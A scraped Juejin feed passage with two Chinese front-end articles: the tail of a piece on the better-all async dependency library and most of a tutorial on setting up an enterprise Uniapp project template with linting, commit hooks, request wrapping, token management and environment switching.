<pre><code class="hljs language-tsx" lang="tsx"><span class="hljs-keyword">const</span> { user, profile, settings } = <span class="hljs-keyword">await</span> <span class="hljs-title function_">all</span>({
  <span class="hljs-keyword">async</span> <span class="hljs-title function_">user</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> <span class="hljs-title function_">fetchUser</span>(<span class="hljs-number">1</span>)
  },
  <span class="hljs-keyword">async</span> <span class="hljs-title function_">profile</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> <span class="hljs-title function_">fetchProfile</span>((<span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">$</span>.<span class="hljs-property">user</span>).<span class="hljs-property">id</span>)
  },
  <span class="hljs-keyword">async</span> <span class="hljs-title function_">settings</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> <span class="hljs-title function_">fetchSettings</span>((<span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">$</span>.<span class="hljs-property">user</span>).<span class="hljs-property">id</span>)
  },
})

<span class="hljs-comment">// user 任务首先运行，然后 profile 和 settings 任务并行运行</span>
</code></pre>
<p><strong>复杂的依赖图：</strong></p>
<pre><code class="hljs language-tsx" lang="tsx"> <span class="hljs-keyword">const</span> { a, b, c, d, e } = <span class="hljs-keyword">await</span> <span class="hljs-title function_">all</span>({
  <span class="hljs-keyword">async</span> <span class="hljs-title function_">a</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>
  },
  <span class="hljs-keyword">async</span> <span class="hljs-title function_">b</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> <span class="hljs-number">2</span>
  },
  <span class="hljs-keyword">async</span> <span class="hljs-title function_">c</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> (<span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">$</span>.<span class="hljs-property">a</span>) + <span class="hljs-number">10</span>
  },
  <span class="hljs-keyword">async</span> <span class="hljs-title function_">d</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> (<span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">$</span>.<span class="hljs-property">b</span>) + <span class="hljs-number">20</span>
  },
  <span class="hljs-keyword">async</span> <span class="hljs-title function_">e</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> (<span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">$</span>.<span class="hljs-property">c</span>) + (<span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">$</span>.<span class="hljs-property">d</span>)
  },
})

<span class="hljs-comment">// a 和 b 并行运行</span>
<span class="hljs-comment">// c 等待 a，d 等待 b (c 和 d 可以重叠并行)</span>
<span class="hljs-comment">// e 等待 c 和 d 都完成</span>

<span class="hljs-comment">// 结果: { a: 1, b: 2, c: 11, d: 22, e: 33 }</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>({ a, b, c, d, e })
</code></pre>
<h2 data-id="heading-6">核心实现机制：Proxy与智能调度</h2>
<p><code>better-all</code>之所以能实现如此优雅的依赖管理，其内部机制主要依赖于JavaScript的<code>Proxy</code>对象和一套精巧的Promise延迟解决（Deferred Resolution）逻辑。</p>
<h3 data-id="heading-7">1. <code>this.$</code>的Proxy代理</h3>
<p><code>better-all</code>为每个任务函数提供了一个特殊的<code>this.$</code>上下文。这个<code>$</code>对象实际上是一个<code>Proxy</code>。当你在任务函数中通过<code>await this.$.dependencyName</code>访问某个依赖时，<code>Proxy</code>会拦截这个访问。</p>
<h3 data-id="heading-8">2. 智能等待机制</h3>
<p>当<code>Proxy</code>拦截到对<code>this.$.dependencyName</code>的访问时，它会检查<code>dependencyName</code>对应的任务是否已经完成。如果已完成，它会立即返回结果；如果尚未完成，它会创建一个新的Promise，并将当前任务的<code>resolve</code>和<code>reject</code>函数注册到<code>dependencyName</code>任务的等待队列中。</p>
<h3 data-id="heading-9">3. 任务的并行启动与结果管理</h3>
<p><code>better-all</code>在开始时会立即启动所有定义的异步任务。每个任务的结果（无论是成功解决还是失败拒绝）都会被存储起来。当一个任务完成时，它会遍历所有等待它的依赖任务，并触发它们的<code>resolve</code>或<code>reject</code>函数，从而解除这些依赖任务的阻塞。</p>
<h3 data-id="heading-10">4. 强大的类型推断</h3>
<p>得益于TypeScript的强大能力，<code>better-all</code>在设计时充分利用了泛型和<code>Awaited&lt;R&gt;</code>等高级类型特性。这意味着，无论你定义了多么复杂的任务和依赖关系，<code>this.$.dependencyName</code>都能提供精确的类型信息，并且最终返回的结果对象也是完全类型安全的，极大地提升了开发体验和代码健壮性。</p>
<h2 data-id="heading-11">better-all 的优势总结</h2>
<ul>
<li>• <strong>自动最大化并行度</strong>：无需手动分析和优化依赖图，库会自动处理，确保任务在满足依赖的前提下尽可能并行执行。</li>
<li>• <strong>极佳的可读性</strong>：通过<code>await this.$.dependency</code>的语法，以最直观的方式表达任务依赖，代码逻辑清晰明了。</li>
<li>• <strong>全方位类型安全</strong>：借助TypeScript，从任务定义到结果获取，全程提供精确的类型推断，有效避免潜在的类型错误。</li>
<li>• <strong>轻量级</strong>：库本身依赖少，打包体积小，对项目性能影响微乎其微。</li>
<li>• <strong>错误处理</strong>：错误传播机制与<code>Promise.all</code>类似，一个任务失败会导致依赖它的任务也失败，并通过<code>try...catch</code>捕获。</li>
</ul>
<h2 data-id="heading-12">适用场景与使用建议</h2>
<h3 data-id="heading-13">✅ 适合使用的场景</h3>
<p><code>better-all</code>特别适用于以下场景：</p>
<ul>
<li><strong>数据聚合</strong>：需要从多个API或数据库中获取数据，且部分数据获取存在前后依赖。</li>
<li><strong>复杂计算流</strong>：一系列计算步骤，其中某些步骤的结果是后续步骤的输入。</li>
<li><strong>构建流程</strong>：例如在构建系统中，某些模块的编译依赖于其他模块的输出。</li>
</ul>
<h3 data-id="heading-14">⚠️ 不适合使用的场景</h3>
<ul>
<li><strong>任务完全独立</strong>：如果所有任务都是独立的，直接使用 <code>Promise.all</code> 更简单。</li>
<li><strong>动态依赖</strong>：如果依赖关系只能在运行时确定，<code>better-all</code> 的静态依赖声明方式可能不适用。</li>
<li><strong>需要精细控制并发数</strong>：如果需要限制同时执行的任务数量，可能需要配合其他库如 <code>p-limit</code>。</li>
</ul>
<h3 data-id="heading-15">💡 最佳实践</h3>
<pre><code class="hljs language-tsx" lang="tsx"><span class="hljs-comment">// ✅ 推荐：清晰的任务命名</span>
<span class="hljs-keyword">const</span> result = <span class="hljs-keyword">await</span> <span class="hljs-title function_">all</span>({
  <span class="hljs-keyword">async</span> <span class="hljs-title function_">userData</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> <span class="hljs-title function_">fetchUser</span>(userId)
  },
  <span class="hljs-keyword">async</span> <span class="hljs-title function_">userProfile</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">const</span> user = <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">$</span>.<span class="hljs-property">userData</span>
    <span class="hljs-keyword">return</span> <span class="hljs-title function_">fetchProfile</span>(user.<span class="hljs-property">id</span>)
  }
})

<span class="hljs-comment">// ❌ 避免：过度复杂的依赖图（超过3层）</span>
<span class="hljs-comment">// 如果依赖层级太深，考虑拆分或重构</span>
</code></pre>
<h2 data-id="heading-16">结语</h2>
<p><code>better-all</code>提供了一种更高级、更智能的异步任务编排方式，它将开发者从繁琐的依赖管理中解放出来，让我们能够更专注于业务逻辑本身。在追求高性能和高可维护性的现代前端开发中，<code>better-all</code>无疑是一个值得关注和尝试的优秀工具。它不仅提升了开发效率，也让我们的异步代码更加健壮和优雅。</p>
<p>记住：<strong>好的工具不是让简单的事情变复杂，而是让复杂的事情变简单。</strong></p>
<hr/>
<blockquote>
<p><strong>💡 React Hooks 工具库推荐</strong> &gt; <strong>@reactuses/core</strong> - 100+ 个生产级 Hooks，覆盖状态、副作用、浏览器 API 等场景 &gt; 📖 <a href="https://link.juejin.cn?target=https%3A%2F%2Freactuse.com%2F" target="_blank" title="https://reactuse.com/" ref="nofollow noopener noreferrer">reactuse.com</a> | 📦 <code>npm i @reactuses/core</code></p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[从零搭建 Uniapp 企业级项目模板]]></title>    <link>https://juejin.cn/post/7592882393251201067</link>    <guid>https://juejin.cn/post/7592882393251201067</guid>    <pubDate>2026-01-09T03:25:25.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592882393251201067" data-draft-id="7592882393251168299" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="从零搭建 Uniapp 企业级项目模板"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2026-01-09T03:25:25.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="借个火er"/> <meta itemprop="url" content="https://juejin.cn/user/2225067265915783"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            从零搭建 Uniapp 企业级项目模板
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2225067265915783/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    借个火er
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-09T03:25:25.000Z" title="Fri Jan 09 2026 03:25:25 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">从零搭建 Uniapp 企业级项目模板</h2>
<blockquote>
<p>一套开箱即用的 Uniapp 项目模板，包含请求封装、Token 管理、多环境切换、工程化配置等企业级功能。</p>
</blockquote>
<h3 data-id="heading-1">前言</h3>
<p>每次新建 Uniapp 项目，都要重复配置 ESLint、封装请求、处理 Token... 于是整理了一套模板，把常用功能都封装好，新项目直接用。</p>
<p>这篇文章分享模板的整体设计和搭建过程。</p>
<hr/>
<h3 data-id="heading-2">一、项目结构</h3>
<pre><code class="hljs language-bash" lang="bash">uniapp-template/
├── src/
│   ├── api/                <span class="hljs-comment"># 接口层</span>
│   │   ├── core/           <span class="hljs-comment"># 请求核心</span>
│   │   │   ├── request.js  <span class="hljs-comment"># 请求封装</span>
│   │   │   └── interceptors.js
│   │   └── user.js         <span class="hljs-comment"># 业务接口示例</span>
│   ├── auth/               <span class="hljs-comment"># 认证模块</span>
│   │   └── tokenManager.js
│   ├── config/             <span class="hljs-comment"># 配置</span>
│   │   └── token.js
│   ├── utils/              <span class="hljs-comment"># 工具函数</span>
│   │   ├── env.js          <span class="hljs-comment"># 环境管理</span>
│   │   └── cache.js        <span class="hljs-comment"># 页面缓存</span>
│   ├── components/         <span class="hljs-comment"># 通用组件</span>
│   ├── pages/              <span class="hljs-comment"># 页面</span>
│   ├── store/              <span class="hljs-comment"># 状态管理</span>
│   ├── styles/             <span class="hljs-comment"># 全局样式</span>
│   │   └── variables.scss
│   ├── App.vue
│   ├── main.js
│   ├── pages.json
│   └── manifest.json
├── docs/                   <span class="hljs-comment"># 项目文档</span>
├── .husky/                 <span class="hljs-comment"># Git Hooks</span>
├── .<span class="hljs-built_in">env</span>                    <span class="hljs-comment"># 环境变量</span>
├── .prettierrc
├── .cz-config.js           <span class="hljs-comment"># 提交规范配置</span>
├── commitlint.config.js
├── eslint.config.js
├── package.json
└── vite.config.js
</code></pre>
<hr/>
<h3 data-id="heading-3">二、工程化配置</h3>
<h4 data-id="heading-4">2.1 ESLint + Prettier</h4>
<p>统一代码风格，避免团队协作时的格式冲突。</p>
<pre><code class="hljs language-bash" lang="bash">pnpm add -D eslint eslint-plugin-vue eslint-config-prettier eslint-plugin-prettier prettier vue-eslint-parser
</code></pre>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// eslint.config.js</span>
<span class="hljs-keyword">import</span> vue <span class="hljs-keyword">from</span> <span class="hljs-string">'eslint-plugin-vue'</span>;
<span class="hljs-keyword">import</span> prettierConfig <span class="hljs-keyword">from</span> <span class="hljs-string">'eslint-config-prettier'</span>;
<span class="hljs-keyword">import</span> prettierPlugin <span class="hljs-keyword">from</span> <span class="hljs-string">'eslint-plugin-prettier'</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> [
  ...vue.<span class="hljs-property">configs</span>[<span class="hljs-string">'flat/strongly-recommended'</span>],
  prettierConfig,
  {
    <span class="hljs-attr">plugins</span>: { <span class="hljs-attr">prettier</span>: prettierPlugin },
    <span class="hljs-attr">rules</span>: { <span class="hljs-string">'prettier/prettier'</span>: <span class="hljs-string">'error'</span> },
  },
  {
    <span class="hljs-attr">languageOptions</span>: {
      <span class="hljs-attr">globals</span>: { <span class="hljs-attr">uni</span>: <span class="hljs-string">'readonly'</span>, <span class="hljs-attr">getCurrentPages</span>: <span class="hljs-string">'readonly'</span> },
    },
    <span class="hljs-attr">rules</span>: {
      <span class="hljs-string">'vue/multi-word-component-names'</span>: <span class="hljs-string">'off'</span>,
      <span class="hljs-string">'no-console'</span>: <span class="hljs-string">'warn'</span>,
      <span class="hljs-string">'eqeqeq'</span>: [<span class="hljs-string">'error'</span>, <span class="hljs-string">'always'</span>],
    },
  },
];
</code></pre>
<pre><code class="hljs language-json" lang="json"><span class="hljs-comment">// .prettierrc</span>
<span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"semi"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"singleQuote"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"printWidth"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">100</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"tabWidth"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">2</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"trailingComma"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"es5"</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<h4 data-id="heading-5">2.2 Husky + lint-staged</h4>
<p>提交前自动检查代码，只检查暂存的文件。</p>
<pre><code class="hljs language-bash" lang="bash">pnpm add -D husky lint-staged
npx husky init
</code></pre>
<pre><code class="hljs language-json" lang="json"><span class="hljs-comment">// package.json</span>
<span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"lint-staged"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"*.{js,vue}"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">"eslint --fix"</span><span class="hljs-punctuation">,</span> <span class="hljs-string">"prettier --write"</span><span class="hljs-punctuation">]</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># .husky/pre-commit</span>
npx lint-staged
</code></pre>
<h4 data-id="heading-6">2.3 Commitizen + Commitlint</h4>
<p>规范提交信息，支持中文提示。</p>
<pre><code class="hljs language-bash" lang="bash">pnpm add -D commitizen cz-customizable @commitlint/cli @commitlint/config-conventional
</code></pre>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// .cz-config.js</span>
<span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = {
  <span class="hljs-attr">types</span>: [
    { <span class="hljs-attr">value</span>: <span class="hljs-string">'feat'</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'✨ feat:     新功能'</span> },
    { <span class="hljs-attr">value</span>: <span class="hljs-string">'fix'</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'🐛 fix:      修复bug'</span> },
    { <span class="hljs-attr">value</span>: <span class="hljs-string">'docs'</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'📝 docs:     文档变更'</span> },
    { <span class="hljs-attr">value</span>: <span class="hljs-string">'style'</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'💄 style:    代码格式'</span> },
    { <span class="hljs-attr">value</span>: <span class="hljs-string">'refactor'</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'♻️ refactor: 重构'</span> },
    { <span class="hljs-attr">value</span>: <span class="hljs-string">'perf'</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'⚡ perf:     性能优化'</span> },
    { <span class="hljs-attr">value</span>: <span class="hljs-string">'chore'</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'🔧 chore:    构建/工具变动'</span> },
  ],
  <span class="hljs-attr">messages</span>: {
    <span class="hljs-attr">type</span>: <span class="hljs-string">'选择提交类型:'</span>,
    <span class="hljs-attr">subject</span>: <span class="hljs-string">'简短描述:'</span>,
    <span class="hljs-attr">confirmCommit</span>: <span class="hljs-string">'确认提交?'</span>,
  },
  <span class="hljs-attr">skipQuestions</span>: [<span class="hljs-string">'scope'</span>, <span class="hljs-string">'body'</span>, <span class="hljs-string">'breaking'</span>, <span class="hljs-string">'footer'</span>],
};
</code></pre>
<p>提交时使用 <code>npx cz</code> 或 <code>pnpm run commit</code>。</p>
<hr/>
<h3 data-id="heading-7">三、请求封装</h3>
<h4 data-id="heading-8">3.1 核心功能</h4>
<ul>
<li>自动拼接 baseURL</li>
<li>自动注入 Token 和公共 Header</li>
<li>Loading 管理（计数器，多请求不闪烁）</li>
<li>错误提示节流（相同错误 1.5s 内只提示一次）</li>
<li>请求取消（防竞态、页面卸载时取消）</li>
<li>防重复请求</li>
</ul>
<h4 data-id="heading-9">3.2 基本用法</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { http } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/api/core/request.js'</span>;

<span class="hljs-comment">// GET</span>
<span class="hljs-keyword">const</span> res = <span class="hljs-keyword">await</span> http.<span class="hljs-title function_">get</span>(<span class="hljs-string">'/api/user/info'</span>, { <span class="hljs-attr">id</span>: <span class="hljs-number">123</span> });

<span class="hljs-comment">// POST</span>
<span class="hljs-keyword">const</span> res = <span class="hljs-keyword">await</span> http.<span class="hljs-title function_">post</span>(<span class="hljs-string">'/api/user/update'</span>, { <span class="hljs-attr">name</span>: <span class="hljs-string">'张三'</span> });

<span class="hljs-comment">// 配置选项</span>
<span class="hljs-keyword">const</span> res = <span class="hljs-keyword">await</span> http.<span class="hljs-title function_">post</span>(<span class="hljs-string">'/api/data'</span>, data, {
  <span class="hljs-attr">loading</span>: <span class="hljs-literal">false</span>,         <span class="hljs-comment">// 不显示 loading</span>
  <span class="hljs-attr">showError</span>: <span class="hljs-literal">false</span>,       <span class="hljs-comment">// 不显示错误提示</span>
  <span class="hljs-attr">cancelPrevious</span>: <span class="hljs-literal">true</span>,   <span class="hljs-comment">// 取消前一个相同请求（搜索场景）</span>
});
</code></pre>
<h4 data-id="heading-10">3.3 请求取消</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { onUnmounted } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>;
<span class="hljs-keyword">import</span> { http } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/api/core/request.js'</span>;

<span class="hljs-comment">// 页面卸载时取消请求</span>
<span class="hljs-title function_">onUnmounted</span>(<span class="hljs-function">() =&gt;</span> {
  http.<span class="hljs-title function_">cancelRequestsByUrl</span>(<span class="hljs-string">'/api/list'</span>);
});
</code></pre>
<h4 data-id="heading-11">3.4 业务接口组织</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// src/api/user.js</span>
<span class="hljs-keyword">import</span> { http } <span class="hljs-keyword">from</span> <span class="hljs-string">'./core/request.js'</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> userApi = {
  <span class="hljs-attr">getInfo</span>: <span class="hljs-function">(<span class="hljs-params">params</span>) =&gt;</span> http.<span class="hljs-title function_">get</span>(<span class="hljs-string">'/api/user/info'</span>, params),
  <span class="hljs-attr">update</span>: <span class="hljs-function">(<span class="hljs-params">data</span>) =&gt;</span> http.<span class="hljs-title function_">post</span>(<span class="hljs-string">'/api/user/update'</span>, data),
  <span class="hljs-attr">search</span>: <span class="hljs-function">(<span class="hljs-params">params</span>) =&gt;</span> http.<span class="hljs-title function_">get</span>(<span class="hljs-string">'/api/user/search'</span>, params, { <span class="hljs-attr">cancelPrevious</span>: <span class="hljs-literal">true</span> }),
};
</code></pre>
<hr/>
<h3 data-id="heading-12">四、Token 管理</h3>
<h4 data-id="heading-13">4.1 功能特性</h4>
<ul>
<li>自动刷新（可配置开关）</li>
<li>并发控制（多请求同时触发刷新只执行一次）</li>
<li>请求队列（刷新期间的请求排队等待）</li>
<li>防重复跳转登录页</li>
</ul>
<h4 data-id="heading-14">4.2 配置</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// src/config/token.js</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">AUTO_REFRESH_ENABLED</span> = <span class="hljs-literal">false</span>;  <span class="hljs-comment">// 是否启用自动刷新</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">BUFFER_TIME</span> = <span class="hljs-number">5</span> * <span class="hljs-number">60</span> * <span class="hljs-number">1000</span>;   <span class="hljs-comment">// 提前 5 分钟刷新</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">REDIRECT_DELAY</span> = <span class="hljs-number">3000</span>;          <span class="hljs-comment">// 防重复跳转间隔</span>
</code></pre>
<h4 data-id="heading-15">4.3 使用</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { tokenManager } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/auth/tokenManager.js'</span>;

<span class="hljs-comment">// 保存 Token</span>
tokenManager.<span class="hljs-title function_">saveToken</span>({
  <span class="hljs-attr">accessToken</span>: <span class="hljs-string">'xxx'</span>,
  <span class="hljs-attr">refreshToken</span>: <span class="hljs-string">'yyy'</span>,
  <span class="hljs-attr">expiresTime</span>: <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>() + <span class="hljs-number">7200000</span>,
});

<span class="hljs-comment">// 检查登录状态</span>
<span class="hljs-keyword">if</span> (tokenManager.<span class="hljs-title function_">isLoggedIn</span>()) {
  <span class="hljs-comment">// 已登录</span>
}

<span class="hljs-comment">// 清除 Token</span>
tokenManager.<span class="hljs-title function_">clearToken</span>();
</code></pre>
<hr/>
<h3 data-id="heading-16">五、多环境切换</h3>
<h4 data-id="heading-17">5.1 环境配置</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># .env</span>
VITE_LOCAL_API_BASE_URL=http://localhost:3000
VITE_DEV_API_BASE_URL=https://api-dev.example.com
VITE_PROD_API_BASE_URL=https://api.example.com
</code></pre>
<h4 data-id="heading-18">5.2 切换方式</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 控制台执行（体验版/开发版可用）</span>
<span class="hljs-title function_">switchEnv</span>(<span class="hljs-string">'dev'</span>)    <span class="hljs-comment">// 测试环境</span>
<span class="hljs-title function_">switchEnv</span>(<span class="hljs-string">'prod'</span>)   <span class="hljs-comment">// 生产环境</span>
<span class="hljs-title function_">switchEnv</span>(<span class="hljs-string">'local'</span>)  <span class="hljs-comment">// 本地环境</span>
</code></pre>
<h4 data-id="heading-19">5.3 安全机制</h4>
<p>线上正式版自动锁定 prod 环境，无法切换：</p>
